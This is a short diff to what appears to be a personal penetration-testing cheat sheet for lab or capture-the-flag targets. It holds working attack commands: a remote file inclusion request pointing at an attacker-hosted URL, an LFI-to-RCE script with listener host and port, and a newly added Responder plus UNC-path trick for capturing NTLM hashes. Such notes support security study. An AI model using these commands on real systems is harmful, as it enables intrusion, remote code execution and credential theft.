@@ -63,3 +63,8 @@ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/sim
 ```
 python3 lfito_rce.py -l "http://192.168.45.224:8000/lfito_rce.py?file=" --lhost 192.168.45.224 --lport 9001  -t 12  -i "http://192.168.151.55/dashboard/phpinfo.php"
 ```
+### RFI To Gain Hash
+```
+sudo responder -I tun0 -A
+http://school.flight.htb/index.php?view=//10.10.14.8/test
+```
